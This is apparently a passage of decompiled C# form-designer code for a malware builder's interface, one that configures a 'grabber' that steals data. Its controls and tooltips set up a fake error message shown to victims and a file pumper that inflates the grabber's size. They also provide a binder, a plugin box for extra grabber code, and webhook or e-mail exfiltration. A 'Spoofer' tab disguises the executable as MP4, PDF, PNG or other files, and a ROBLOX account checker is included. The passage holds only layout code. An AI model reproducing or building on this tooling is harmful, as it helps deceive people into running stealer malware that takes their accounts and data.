			this.errorTitleTextBox.CustomButton.TabIndex = 1;
			this.errorTitleTextBox.CustomButton.Theme = 1;
			this.errorTitleTextBox.CustomButton.UseSelectable = true;
			this.errorTitleTextBox.CustomButton.Visible = false;
			this.errorTitleTextBox.Enabled = false;
			this.errorTitleTextBox.ForeColor = Color.White;
			this.errorTitleTextBox.Lines = new string[0];
			this.errorTitleTextBox.Location = new Point(433, 55);
			this.errorTitleTextBox.MaxLength = 32767;
			this.errorTitleTextBox.Name = "errorTitleTextBox";
			this.errorTitleTextBox.PasswordChar = '\0';
			this.errorTitleTextBox.PromptText = "Fake Error Title";
			this.errorTitleTextBox.ScrollBars = ScrollBars.None;
			this.errorTitleTextBox.SelectedText = "";
			this.errorTitleTextBox.SelectionLength = 0;
			this.errorTitleTextBox.SelectionStart = 0;
			this.errorTitleTextBox.ShortcutsEnabled = true;
			this.errorTitleTextBox.Size = new Size(167, 22);
			this.errorTitleTextBox.TabIndex = 8;
			this.errorTitleTextBox.Theme = 2;
			this.metroToolTip.SetToolTip(this.errorTitleTextBox, "Title of the error message");
			this.errorTitleTextBox.UseSelectable = true;
			this.errorTitleTextBox.WaterMark = "Fake Error Title";
			this.errorTitleTextBox.WaterMarkColor = Color.FromArgb(109, 109, 109);
			this.errorTitleTextBox.WaterMarkFont = new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel);
			this.embedColorPictureBox.BackColor = Color.Transparent;
			this.embedColorPictureBox.BorderStyle = BorderStyle.FixedSingle;
			this.embedColorPictureBox.Location = new Point(761, 55);
			this.embedColorPictureBox.Name = "embedColorPictureBox";
			this.embedColorPictureBox.Size = new Size(50, 50);
			this.embedColorPictureBox.TabIndex = 35;
			this.embedColorPictureBox.TabStop = false;
			this.iconPictureBox.BackColor = Color.Transparent;
			this.iconPictureBox.BorderStyle = BorderStyle.FixedSingle;
			this.iconPictureBox.Enabled = false;
			this.iconPictureBox.Location = new Point(150, 55);
			this.iconPictureBox.Name = "iconPictureBox";
			this.iconPictureBox.Size = new Size(50, 50);
			this.iconPictureBox.SizeMode = PictureBoxSizeMode.Zoom;
			this.iconPictureBox.TabIndex = 33;
			this.iconPictureBox.TabStop = false;
			this.errorMessageTextBox.CustomButton.Image = null;
			this.errorMessageTextBox.CustomButton.Location = new Point(147, 2);
			this.errorMessageTextBox.CustomButton.Name = "";
			this.errorMessageTextBox.CustomButton.Size = new Size(17, 17);
			this.errorMessageTextBox.CustomButton.Style = 4;
			this.errorMessageTextBox.CustomButton.TabIndex = 1;
			this.errorMessageTextBox.CustomButton.Theme = 1;
			this.errorMessageTextBox.CustomButton.UseSelectable = true;
			this.errorMessageTextBox.CustomButton.Visible = false;
			this.errorMessageTextBox.Enabled = false;
			this.errorMessageTextBox.ForeColor = Color.White;
			this.errorMessageTextBox.Lines = new string[0];
			this.errorMessageTextBox.Location = new Point(433, 83);
			this.errorMessageTextBox.MaxLength = 32767;
			this.errorMessageTextBox.Name = "errorMessageTextBox";
			this.errorMessageTextBox.PasswordChar = '\0';
			this.errorMessageTextBox.PromptText = "Fake Error Message";
			this.errorMessageTextBox.ScrollBars = ScrollBars.None;
			this.errorMessageTextBox.SelectedText = "";
			this.errorMessageTextBox.SelectionLength = 0;
			this.errorMessageTextBox.SelectionStart = 0;
			this.errorMessageTextBox.ShortcutsEnabled = true;
			this.errorMessageTextBox.Size = new Size(167, 22);
			this.errorMessageTextBox.TabIndex = 9;
			this.errorMessageTextBox.Theme = 2;
			this.metroToolTip.SetToolTip(this.errorMessageTextBox, "Message of the error message");
			this.errorMessageTextBox.UseSelectable = true;
			this.errorMessageTextBox.WaterMark = "Fake Error Message";
			this.errorMessageTextBox.WaterMarkColor = Color.FromArgb(109, 109, 109);
			this.errorMessageTextBox.WaterMarkFont = new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel);
			this.iconCheckBox.AutoSize = true;
			this.iconCheckBox.Location = new Point(31, 32);
			this.iconCheckBox.Name = "iconCheckBox";
			this.iconCheckBox.Size = new Size(91, 15);
			this.iconCheckBox.TabIndex = 31;
			this.iconCheckBox.Text = "Custom Icon";
			this.iconCheckBox.Theme = 2;
			this.metroToolTip.SetToolTip(this.iconCheckBox, "Grabber icon");
			this.iconCheckBox.UseSelectable = true;
			this.iconCheckBox.CheckedChanged += this.iconCheckBox_CheckedChanged;
			this.fakeErrorCheckBox.AutoSize = true;
			this.fakeErrorCheckBox.Location = new Point(433, 32);
			this.fakeErrorCheckBox.Name = "fakeErrorCheckBox";
			this.fakeErrorCheckBox.Size = new Size(75, 15);
			this.fakeErrorCheckBox.TabIndex = 14;
			this.fakeErrorCheckBox.Text = "Fake Error";
			this.fakeErrorCheckBox.Theme = 2;
			this.metroToolTip.SetToolTip(this.fakeErrorCheckBox, "Shows a messagebox when the grabber opens");
			this.fakeErrorCheckBox.UseSelectable = true;
			this.fakeErrorCheckBox.CheckedChanged += this.fakeErrorCheckBox_CheckedChanged;
			this.iconPathTextBox.CustomButton.Image = null;
			this.iconPathTextBox.CustomButton.Location = new Point(93, 2);
			this.iconPathTextBox.CustomButton.Name = "";
			this.iconPathTextBox.CustomButton.Size = new Size(17, 17);
			this.iconPathTextBox.CustomButton.Style = 4;
			this.iconPathTextBox.CustomButton.TabIndex = 1;
			this.iconPathTextBox.CustomButton.Theme = 1;
			this.iconPathTextBox.CustomButton.UseSelectable = true;
			this.iconPathTextBox.CustomButton.Visible = false;
			this.iconPathTextBox.Enabled = false;
			this.iconPathTextBox.ForeColor = Color.White;
			this.iconPathTextBox.Lines = new string[0];
			this.iconPathTextBox.Location = new Point(31, 55);
			this.iconPathTextBox.MaxLength = 32767;
			this.iconPathTextBox.Name = "iconPathTextBox";
			this.iconPathTextBox.PasswordChar = '\0';
			this.iconPathTextBox.PromptText = "Icon Path";
			this.iconPathTextBox.ReadOnly = true;
			this.iconPathTextBox.ScrollBars = ScrollBars.None;
			this.iconPathTextBox.SelectedText = "";
			this.iconPathTextBox.SelectionLength = 0;
			this.iconPathTextBox.SelectionStart = 0;
			this.iconPathTextBox.ShortcutsEnabled = true;
			this.iconPathTextBox.Size = new Size(113, 22);
			this.iconPathTextBox.TabIndex = 30;
			this.iconPathTextBox.Theme = 2;
			this.metroToolTip.SetToolTip(this.iconPathTextBox, "Path to the icon");
			this.iconPathTextBox.UseSelectable = true;
			this.iconPathTextBox.WaterMark = "Icon Path";
			this.iconPathTextBox.WaterMarkColor = Color.FromArgb(109, 109, 109);
			this.iconPathTextBox.WaterMarkFont = new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel);
			this.pumpAmountTextBox.CustomButton.Image = null;
			this.pumpAmountTextBox.CustomButton.Location = new Point(147, 2);
			this.pumpAmountTextBox.CustomButton.Name = "";
			this.pumpAmountTextBox.CustomButton.Size = new Size(17, 17);
			this.pumpAmountTextBox.CustomButton.Style = 4;
			this.pumpAmountTextBox.CustomButton.TabIndex = 1;
			this.pumpAmountTextBox.CustomButton.Theme = 1;
			this.pumpAmountTextBox.CustomButton.UseSelectable = true;
			this.pumpAmountTextBox.CustomButton.Visible = false;
			this.pumpAmountTextBox.Enabled = false;
			this.pumpAmountTextBox.ForeColor = Color.White;
			this.pumpAmountTextBox.Lines = new string[0];
			this.pumpAmountTextBox.Location = new Point(235, 55);
			this.pumpAmountTextBox.MaxLength = 32767;
			this.pumpAmountTextBox.Name = "pumpAmountTextBox";
			this.pumpAmountTextBox.PasswordChar = '\0';
			this.pumpAmountTextBox.PromptText = "Pump Amount";
			this.pumpAmountTextBox.ScrollBars = ScrollBars.None;
			this.pumpAmountTextBox.SelectedText = "";
			this.pumpAmountTextBox.SelectionLength = 0;
			this.pumpAmountTextBox.SelectionStart = 0;
			this.pumpAmountTextBox.ShortcutsEnabled = true;
			this.pumpAmountTextBox.Size = new Size(167, 22);
			this.pumpAmountTextBox.TabIndex = 25;
			this.pumpAmountTextBox.Theme = 2;
			this.metroToolTip.SetToolTip(this.pumpAmountTextBox, "Amount of bytes to pump in the grabber");
			this.pumpAmountTextBox.UseSelectable = true;
			this.pumpAmountTextBox.WaterMark = "Pump Amount";
			this.pumpAmountTextBox.WaterMarkColor = Color.FromArgb(109, 109, 109);
			this.pumpAmountTextBox.WaterMarkFont = new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel);
			this.byteCheckBox.AutoSize = true;
			this.byteCheckBox.Enabled = false;
			this.byteCheckBox.FontSize = 1;
			this.byteCheckBox.Location = new Point(235, 85);
			this.byteCheckBox.Name = "byteCheckBox";
			this.byteCheckBox.Size = new Size(33, 19);
			this.byteCheckBox.TabIndex = 27;
			this.byteCheckBox.Text = "B";
			this.byteCheckBox.Theme = 2;
			this.metroToolTip.SetToolTip(this.byteCheckBox, "Bytes");
			this.byteCheckBox.UseSelectable = true;
			this.kiloByteCheckBox.AutoSize = true;
			this.kiloByteCheckBox.Enabled = false;
			this.kiloByteCheckBox.FontSize = 1;
			this.kiloByteCheckBox.Location = new Point(290, 85);
			this.kiloByteCheckBox.Name = "kiloByteCheckBox";
			this.kiloByteCheckBox.Size = new Size(41, 19);
			this.kiloByteCheckBox.TabIndex = 28;
			this.kiloByteCheckBox.Text = "KB";
			this.kiloByteCheckBox.Theme = 2;
			this.metroToolTip.SetToolTip(this.kiloByteCheckBox, "Kilobytes");
			this.kiloByteCheckBox.UseSelectable = true;
			this.filePumperCheckBox.AutoSize = true;
			this.filePumperCheckBox.Location = new Point(235, 32);
			this.filePumperCheckBox.Name = "filePumperCheckBox";
			this.filePumperCheckBox.Size = new Size(86, 15);
			this.filePumperCheckBox.TabIndex = 26;
			this.filePumperCheckBox.Text = "File Pumper";
			this.filePumperCheckBox.Theme = 2;
			this.metroToolTip.SetToolTip(this.filePumperCheckBox, "Makes the grabber file size bigger");
			this.filePumperCheckBox.UseSelectable = true;
			this.filePumperCheckBox.CheckedChanged += this.filePumperCheckBox_CheckedChanged;
			this.megaByteCheckBox.AutoSize = true;
			this.megaByteCheckBox.Enabled = false;
			this.megaByteCheckBox.FontSize = 1;
			this.megaByteCheckBox.Location = new Point(355, 85);
			this.megaByteCheckBox.Name = "megaByteCheckBox";
			this.megaByteCheckBox.Size = new Size(46, 19);
			this.megaByteCheckBox.TabIndex = 29;
			this.megaByteCheckBox.Text = "MB";
			this.megaByteCheckBox.Theme = 2;
			this.metroToolTip.SetToolTip(this.megaByteCheckBox, "Megabytes");
			this.megaByteCheckBox.UseSelectable = true;
			this.pluginsTab.BorderStyle = BorderStyle.FixedSingle;
			this.pluginsTab.Controls.Add(this.pluginTextBox);
			this.pluginsTab.HorizontalScrollbarBarColor = true;
			this.pluginsTab.HorizontalScrollbarHighlightOnWheel = false;
			this.pluginsTab.HorizontalScrollbarSize = 10;
			this.pluginsTab.Location = new Point(4, 38);
			this.pluginsTab.Name = "pluginsTab";
			this.pluginsTab.Size = new Size(845, 234);
			this.pluginsTab.TabIndex = 3;
			this.pluginsTab.Text = "Plugins";
			this.pluginsTab.Theme = 2;
			this.pluginsTab.VerticalScrollbarBarColor = true;
			this.pluginsTab.VerticalScrollbarHighlightOnWheel = false;
			this.pluginsTab.VerticalScrollbarSize = 10;
			this.pluginTextBox.AutoCompleteBracketsList = new char[]
			{
				'(',
				')',
				'{',
				'}',
				'[',
				']',
				'"',
				'"',
				'\'',
				'\''
			};
			this.pluginTextBox.AutoIndentCharsPatterns = "\r\n^\\s*[\\w\\.]+(\\s\\w+)?\\s*(?<range>=)\\s*(?<range>[^;]+);\r\n^\\s*(case|default)\\s*[^:]*(?<range>:)\\s*(?<range>[^;]+);\r\n";
			this.pluginTextBox.AutoScrollMinSize = new Size(27, 14);
			this.pluginTextBox.BackBrush = null;
			this.pluginTextBox.BackColor = Color.FromArgb(17, 17, 17);
			this.pluginTextBox.BorderStyle = BorderStyle.FixedSingle;
			this.pluginTextBox.BracketsHighlightStrategy = 1;
			this.pluginTextBox.CharHeight = 14;
			this.pluginTextBox.CharWidth = 8;
			this.pluginTextBox.Cursor = Cursors.IBeam;
			this.pluginTextBox.DisabledColor = Color.FromArgb(100, 180, 180, 180);
			this.pluginTextBox.Font = new Font("Courier New", 9.75f);
			this.pluginTextBox.HighlightingRangeType = 1;
			this.pluginTextBox.IndentBackColor = Color.FromArgb(17, 17, 17);
			this.pluginTextBox.IsReplaceMode = false;
			this.pluginTextBox.Language = 1;
			this.pluginTextBox.LeftBracket = '(';
			this.pluginTextBox.LeftBracket2 = '{';
			this.pluginTextBox.LineNumberColor = Color.White;
			this.pluginTextBox.Location = new Point(31, 29);
			this.pluginTextBox.Name = "pluginTextBox";
			this.pluginTextBox.Paddings = new Padding(0);
			this.pluginTextBox.RightBracket = ')';
			this.pluginTextBox.RightBracket2 = '}';
			this.pluginTextBox.SelectionColor = Color.FromArgb(60, 0, 0, 255);
			this.pluginTextBox.ServiceColors = (ServiceColors)componentResourceManager.GetObject("pluginTextBox.ServiceColors");
			this.pluginTextBox.Size = new Size(781, 174);
			this.pluginTextBox.TabIndex = 3;
			this.metroToolTip.SetToolTip(this.pluginTextBox, "Extra code to add to the grabber");
			this.pluginTextBox.Zoom = 100;
			this.binderTab.BorderStyle = BorderStyle.FixedSingle;
			this.binderTab.Controls.Add(this.removeButton);
			this.binderTab.Controls.Add(this.filesListView);
			this.binderTab.Controls.Add(this.addButton);
			this.binderTab.HorizontalScrollbarBarColor = true;
			this.binderTab.HorizontalScrollbarHighlightOnWheel = false;
			this.binderTab.HorizontalScrollbarSize = 10;
			this.binderTab.Location = new Point(4, 35);
			this.binderTab.Name = "binderTab";
			this.binderTab.Size = new Size(845, 237);
			this.binderTab.TabIndex = 4;
			this.binderTab.Text = "Binder";
			this.binderTab.Theme = 2;
			this.binderTab.VerticalScrollbarBarColor = true;
			this.binderTab.VerticalScrollbarHighlightOnWheel = false;
			this.binderTab.VerticalScrollbarSize = 10;
			this.removeButton.Highlight = true;
			this.removeButton.Location = new Point(425, 171);
			this.removeButton.Name = "removeButton";
			this.removeButton.Size = new Size(388, 32);
			this.removeButton.TabIndex = 43;
			this.removeButton.Text = "Remove";
			this.removeButton.Theme = 2;
			this.removeButton.UseSelectable = true;
			this.removeButton.Click += this.removeButton_Click;
			this.filesListView.BackColor = Color.FromArgb(17, 17, 17);
			this.filesListView.Columns.AddRange(new ColumnHeader[]
			{
				this.fileNameHeader,
				this.fileSizeHeader
			});
			this.filesListView.Font = new Font("Segoe UI Semibold", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.filesListView.ForeColor = Color.White;
			this.filesListView.FullRowSelect = true;
			this.filesListView.HideSelection = false;
			this.filesListView.Location = new Point(31, 30);
			this.filesListView.Margin = new Padding(4);
			this.filesListView.Name = "filesListView";
			this.filesListView.Size = new Size(782, 135);
			this.filesListView.TabIndex = 42;
			this.filesListView.UseCompatibleStateImageBehavior = false;
			this.filesListView.View = View.Details;
			this.fileNameHeader.Text = "File Name";
			this.fileNameHeader.Width = 389;
			this.fileSizeHeader.Text = "File Size";
			this.fileSizeHeader.Width = 389;
			this.addButton.Highlight = true;
			this.addButton.Location = new Point(31, 171);
			this.addButton.Name = "addButton";
			this.addButton.Size = new Size(388, 32);
			this.addButton.TabIndex = 41;
			this.addButton.Text = "Add";
			this.addButton.Theme = 2;
			this.addButton.UseSelectable = true;
			this.addButton.Click += this.addButton_Click;
			this.compilerTab.BorderStyle = BorderStyle.FixedSingle;
			this.compilerTab.Controls.Add(this.compileButton);
			this.compilerTab.Controls.Add(this.compilerOutputTextBox);
			this.compilerTab.HorizontalScrollbarBarColor = true;
			this.compilerTab.HorizontalScrollbarHighlightOnWheel = false;
			this.compilerTab.HorizontalScrollbarSize = 10;
			this.compilerTab.Location = new Point(4, 35);
			this.compilerTab.Name = "compilerTab";
			this.compilerTab.Size = new Size(845, 237);
			this.compilerTab.TabIndex = 2;
			this.compilerTab.Text = "Compiler";
			this.compilerTab.Theme = 2;
			this.compilerTab.VerticalScrollbarBarColor = true;
			this.compilerTab.VerticalScrollbarHighlightOnWheel = false;
			this.compilerTab.VerticalScrollbarSize = 10;
			this.compilerTab.Click += this.compilerTab_Click;
			this.compileButton.Highlight = true;
			this.compileButton.Location = new Point(32, 171);
			this.compileButton.Name = "compileButton";
			this.compileButton.Size = new Size(781, 32);
			this.compileButton.TabIndex = 39;
			this.compileButton.Text = "Compile";
			this.compileButton.Theme = 2;
			this.compileButton.UseSelectable = true;
			this.compileButton.Click += this.compileButton_Click;
			this.compilerOutputTextBox.CustomButton.Image = null;
			this.compilerOutputTextBox.CustomButton.Location = new Point(647, 1);
			this.compilerOutputTextBox.CustomButton.Name = "";
			this.compilerOutputTextBox.CustomButton.Size = new Size(133, 133);
			this.compilerOutputTextBox.CustomButton.Style = 4;
			this.compilerOutputTextBox.CustomButton.TabIndex = 1;
			this.compilerOutputTextBox.CustomButton.Theme = 1;
			this.compilerOutputTextBox.CustomButton.UseSelectable = true;
			this.compilerOutputTextBox.CustomButton.Visible = false;
			this.compilerOutputTextBox.FontWeight = 2;
			this.compilerOutputTextBox.ForeColor = Color.White;
			this.compilerOutputTextBox.Lines = new string[0];
			this.compilerOutputTextBox.Location = new Point(32, 30);
			this.compilerOutputTextBox.MaxLength = 32767;
			this.compilerOutputTextBox.Multiline = true;
			this.compilerOutputTextBox.Name = "compilerOutputTextBox";
			this.compilerOutputTextBox.PasswordChar = '\0';
			this.compilerOutputTextBox.PromptText = "Waiting for compiling...";
			this.compilerOutputTextBox.ReadOnly = true;
			this.compilerOutputTextBox.ScrollBars = ScrollBars.Vertical;
			this.compilerOutputTextBox.SelectedText = "";
			this.compilerOutputTextBox.SelectionLength = 0;
			this.compilerOutputTextBox.SelectionStart = 0;
			this.compilerOutputTextBox.ShortcutsEnabled = true;
			this.compilerOutputTextBox.Size = new Size(781, 135);
			this.compilerOutputTextBox.TabIndex = 3;
			this.compilerOutputTextBox.Theme = 2;
			this.compilerOutputTextBox.UseSelectable = true;
			this.compilerOutputTextBox.WaterMark = "Waiting for compiling...";
			this.compilerOutputTextBox.WaterMarkColor = Color.FromArgb(109, 109, 109);
			this.compilerOutputTextBox.WaterMarkFont = new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel);
			this.webhookGroupBox.BackColor = Color.Transparent;
			this.webhookGroupBox.Controls.Add(this.emailCheckBox1);
			this.webhookGroupBox.Controls.Add(this.webhookIDbox);
			this.webhookGroupBox.Controls.Add(this.testWebhookButton);
			this.webhookGroupBox.Controls.Add(this.webhookTextBox);
			this.webhookGroupBox.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.webhookGroupBox.ForeColor = Color.White;
			this.webhookGroupBox.Location = new Point(30, 19);
			this.webhookGroupBox.Name = "webhookGroupBox";
			this.webhookGroupBox.Size = new Size(845, 74);
			this.webhookGroupBox.TabIndex = 19;
			this.webhookGroupBox.TabStop = false;
			this.webhookGroupBox.Text = "Webhook";
			this.emailCheckBox1.AutoSize = true;
			this.emailCheckBox1.Enabled = false;
			this.emailCheckBox1.Location = new Point(21, 53);
			this.emailCheckBox1.Name = "emailCheckBox1";
			this.emailCheckBox1.Size = new Size(108, 15);
			this.emailCheckBox1.TabIndex = 43;
			this.emailCheckBox1.Text = "switch to E-mail";
			this.emailCheckBox1.Theme = 2;
			this.metroToolTip.SetToolTip(this.emailCheckBox1, "Switch the recovery-retrieve method to E-mail");
			this.emailCheckBox1.UseSelectable = true;
			this.webhookIDbox.CustomButton.Image = null;
			this.webhookIDbox.CustomButton.Location = new Point(203, 2);
			this.webhookIDbox.CustomButton.Name = "";
			this.webhookIDbox.CustomButton.Size = new Size(17, 17);
			this.webhookIDbox.CustomButton.Style = 4;
			this.webhookIDbox.CustomButton.TabIndex = 1;
			this.webhookIDbox.CustomButton.Theme = 1;
			this.webhookIDbox.CustomButton.UseSelectable = true;
			this.webhookIDbox.CustomButton.Visible = false;
			this.webhookIDbox.ForeColor = Color.White;
			this.webhookIDbox.Lines = new string[0];
			this.webhookIDbox.Location = new Point(464, 26);
			this.webhookIDbox.MaxLength = 32767;
			this.webhookIDbox.Name = "webhookIDbox";
			this.webhookIDbox.PasswordChar = '\0';
			this.webhookIDbox.PromptText = "Webhook ID";
			this.webhookIDbox.ScrollBars = ScrollBars.None;
			this.webhookIDbox.SelectedText = "";
			this.webhookIDbox.SelectionLength = 0;
			this.webhookIDbox.SelectionStart = 0;
			this.webhookIDbox.ShortcutsEnabled = true;
			this.webhookIDbox.Size = new Size(223, 22);
			this.webhookIDbox.TabIndex = 42;
			this.webhookIDbox.Theme = 2;
			this.metroToolTip.SetToolTip(this.webhookIDbox, "The ID part of the Webhook");
			this.webhookIDbox.UseSelectable = true;
			this.webhookIDbox.WaterMark = "Webhook ID";
			this.webhookIDbox.WaterMarkColor = Color.FromArgb(109, 109, 109);
			this.webhookIDbox.WaterMarkFont = new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel);
			this.testWebhookButton.Highlight = true;
			this.testWebhookButton.Location = new Point(693, 26);
			this.testWebhookButton.Name = "testWebhookButton";
			this.testWebhookButton.Size = new Size(130, 22);
			this.testWebhookButton.TabIndex = 41;
			this.testWebhookButton.Text = "Test Webhook";
			this.testWebhookButton.Theme = 2;
			this.testWebhookButton.UseSelectable = true;
			this.testWebhookButton.Click += this.testWebhookButton_Click_1;
			this.webhookTextBox.CustomButton.Image = null;
			this.webhookTextBox.CustomButton.Location = new Point(417, 2);
			this.webhookTextBox.CustomButton.Name = "";
			this.webhookTextBox.CustomButton.Size = new Size(17, 17);
			this.webhookTextBox.CustomButton.Style = 4;
			this.webhookTextBox.CustomButton.TabIndex = 1;
			this.webhookTextBox.CustomButton.Theme = 1;
			this.webhookTextBox.CustomButton.UseSelectable = true;
			this.webhookTextBox.CustomButton.Visible = false;
			this.webhookTextBox.ForeColor = Color.White;
			this.webhookTextBox.Lines = new string[0];
			this.webhookTextBox.Location = new Point(21, 26);
			this.webhookTextBox.MaxLength = 32767;
			this.webhookTextBox.Name = "webhookTextBox";
			this.webhookTextBox.PasswordChar = '\0';
			this.webhookTextBox.PromptText = "Webhook";
			this.webhookTextBox.ScrollBars = ScrollBars.None;
			this.webhookTextBox.SelectedText = "";
			this.webhookTextBox.SelectionLength = 0;
			this.webhookTextBox.SelectionStart = 0;
			this.webhookTextBox.ShortcutsEnabled = true;
			this.webhookTextBox.Size = new Size(437, 22);
			this.webhookTextBox.TabIndex = 40;
			this.webhookTextBox.Theme = 2;
			this.metroToolTip.SetToolTip(this.webhookTextBox, "The text part of the Webhook");
			this.webhookTextBox.UseSelectable = true;
			this.webhookTextBox.WaterMark = "Webhook";
			this.webhookTextBox.WaterMarkColor = Color.FromArgb(109, 109, 109);
			this.webhookTextBox.WaterMarkFont = new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel);
			this.metroTabPage2.BorderStyle = BorderStyle.FixedSingle;
			this.metroTabPage2.Controls.Add(this.groupBox3);
			this.metroTabPage2.Controls.Add(this.metroTabControl1);
			this.metroTabPage2.HorizontalScrollbarBarColor = true;
			this.metroTabPage2.HorizontalScrollbarHighlightOnWheel = false;
			this.metroTabPage2.HorizontalScrollbarSize = 10;
			this.metroTabPage2.Location = new Point(4, 38);
			this.metroTabPage2.Name = "metroTabPage2";
			this.metroTabPage2.Size = new Size(907, 399);
			this.metroTabPage2.TabIndex = 6;
			this.metroTabPage2.Text = "Spoofer";
			this.metroTabPage2.Theme = 2;
			this.metroTabPage2.VerticalScrollbarBarColor = true;
			this.metroTabPage2.VerticalScrollbarHighlightOnWheel = false;
			this.metroTabPage2.VerticalScrollbarSize = 10;
			this.metroTabPage2.Click += this.metroTabPage2_Click;
			this.groupBox3.BackColor = Color.Transparent;
			this.groupBox3.Controls.Add(this.rbxl);
			this.groupBox3.Controls.Add(this.appname);
			this.groupBox3.Controls.Add(this.mp4);
			this.groupBox3.Controls.Add(this.pdf);
			this.groupBox3.Controls.Add(this.txt);
			this.groupBox3.Controls.Add(this.png);
			this.groupBox3.Controls.Add(this.py);
			this.groupBox3.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.groupBox3.ForeColor = Color.White;
			this.groupBox3.Location = new Point(30, 20);
			this.groupBox3.Name = "groupBox3";
			this.groupBox3.Size = new Size(845, 187);
			this.groupBox3.TabIndex = 55;
			this.groupBox3.TabStop = false;
			this.groupBox3.Text = "Configuration";
			this.groupBox3.Enter += this.groupBox3_Enter;
			this.rbxl.AutoSize = true;
			this.rbxl.Location = new Point(21, 125);
			this.rbxl.Name = "rbxl";
			this.rbxl.Size = new Size(50, 15);
			this.rbxl.TabIndex = 56;
			this.rbxl.Text = "RBXL";
			this.rbxl.Theme = 2;
			this.metroToolTip.SetToolTip(this.rbxl, "TEXT");
			this.rbxl.UseSelectable = true;
			this.rbxl.CheckedChanged += this.rbxl_CheckedChanged;
			this.appname.CustomButton.Image = null;
			this.appname.CustomButton.Location = new Point(203, 2);
			this.appname.CustomButton.Name = "";
			this.appname.CustomButton.Size = new Size(17, 17);
			this.appname.CustomButton.Style = 4;
			this.appname.CustomButton.TabIndex = 1;
			this.appname.CustomButton.Theme = 1;
			this.appname.CustomButton.UseSelectable = true;
			this.appname.CustomButton.Visible = false;
			this.appname.ForeColor = Color.White;
			this.appname.Lines = new string[0];
			this.appname.Location = new Point(21, 146);
			this.appname.MaxLength = 32767;
			this.appname.Name = "appname";
			this.appname.PasswordChar = '\0';
			this.appname.PromptText = "Application";
			this.appname.ScrollBars = ScrollBars.None;
			this.appname.SelectedText = "";
			this.appname.SelectionLength = 0;
			this.appname.SelectionStart = 0;
			this.appname.ShortcutsEnabled = true;
			this.appname.Size = new Size(223, 22);
			this.appname.TabIndex = 55;
			this.appname.Theme = 2;
			this.metroToolTip.SetToolTip(this.appname, "Name of your .exe");
			this.appname.UseSelectable = true;
			this.appname.WaterMark = "Application";
			this.appname.WaterMarkColor = Color.FromArgb(109, 109, 109);
			this.appname.WaterMarkFont = new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel);
			this.mp4.AutoSize = true;
			this.mp4.Location = new Point(21, 20);
			this.mp4.Name = "mp4";
			this.mp4.Size = new Size(47, 15);
			this.mp4.TabIndex = 50;
			this.mp4.Text = "MP4";
			this.mp4.Theme = 2;
			this.metroToolTip.SetToolTip(this.mp4, "MP4");
			this.mp4.UseSelectable = true;
			this.mp4.CheckedChanged += this.mp4_CheckedChanged;
			this.pdf.AutoSize = true;
			this.pdf.Location = new Point(21, 41);
			this.pdf.Name = "pdf";
			this.pdf.Size = new Size(44, 15);
			this.pdf.TabIndex = 51;
			this.pdf.Text = "PDF";
			this.pdf.Theme = 2;
			this.metroToolTip.SetToolTip(this.pdf, "PDF");
			this.pdf.UseSelectable = true;
			this.pdf.CheckedChanged += this.pdf_CheckedChanged;
			this.txt.AutoSize = true;
			this.txt.Location = new Point(21, 104);
			this.txt.Name = "txt";
			this.txt.Size = new Size(42, 15);
			this.txt.TabIndex = 54;
			this.txt.Text = "TXT";
			this.txt.Theme = 2;
			this.metroToolTip.SetToolTip(this.txt, "TEXT");
			this.txt.UseSelectable = true;
			this.txt.CheckedChanged += this.txt_CheckedChanged;
			this.png.AutoSize = true;
			this.png.Location = new Point(21, 62);
			this.png.Name = "png";
			this.png.Size = new Size(47, 15);
			this.png.TabIndex = 52;
			this.png.Text = "PNG";
			this.png.Theme = 2;
			this.metroToolTip.SetToolTip(this.png, "PNG");
			this.png.UseSelectable = true;
			this.png.CheckedChanged += this.png_CheckedChanged;
			this.py.AutoSize = true;
			this.py.Location = new Point(21, 83);
			this.py.Name = "py";
			this.py.Size = new Size(37, 15);
			this.py.TabIndex = 53;
			this.py.Text = "PY";
			this.py.Theme = 2;
			this.metroToolTip.SetToolTip(this.py, "PYTHON");
			this.py.UseSelectable = true;
			this.py.CheckedChanged += this.py_CheckedChanged;
			this.metroTabControl1.Location = new Point(858, 353);
			this.metroTabControl1.Name = "metroTabControl1";
			this.metroTabControl1.Size = new Size(17, 22);
			this.metroTabControl1.SizeMode = TabSizeMode.Fixed;
			this.metroTabControl1.TabIndex = 18;
			this.metroTabControl1.Theme = 2;
			this.metroTabControl1.UseSelectable = true;
			this.otherTab.BorderStyle = BorderStyle.FixedSingle;
			this.otherTab.Controls.Add(this.groupBox4);
			this.otherTab.Controls.Add(this.groupBox2);
			this.otherTab.HorizontalScrollbarBarColor = true;
			this.otherTab.HorizontalScrollbarHighlightOnWheel = false;
			this.otherTab.HorizontalScrollbarSize = 10;
			this.otherTab.Location = new Point(4, 38);
			this.otherTab.Name = "otherTab";
			this.otherTab.Size = new Size(907, 399);
			this.otherTab.TabIndex = 4;
			this.otherTab.Text = "External";
			this.otherTab.Theme = 2;
			this.otherTab.VerticalScrollbarBarColor = true;
			this.otherTab.VerticalScrollbarHighlightOnWheel = false;
			this.otherTab.VerticalScrollbarSize = 10;
			this.groupBox2.BackColor = Color.Transparent;
			this.groupBox2.Controls.Add(this.metroButton3);
			this.groupBox2.Controls.Add(this.rblxc);
			this.groupBox2.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold);
			this.groupBox2.ForeColor = Color.White;
			this.groupBox2.Location = new Point(30, 19);
			this.groupBox2.Name = "groupBox2";
			this.groupBox2.Size = new Size(419, 351);
			this.groupBox2.TabIndex = 63;
			this.groupBox2.TabStop = false;
			this.groupBox2.Text = "ROBLOX";
			this.metroButton3.Highlight = true;
			this.metroButton3.Location = new Point(21, 48);
			this.metroButton3.Name = "metroButton3";
			this.metroButton3.Size = new Size(382, 22);
			this.metroButton3.TabIndex = 75;
			this.metroButton3.Text = "Check Account";
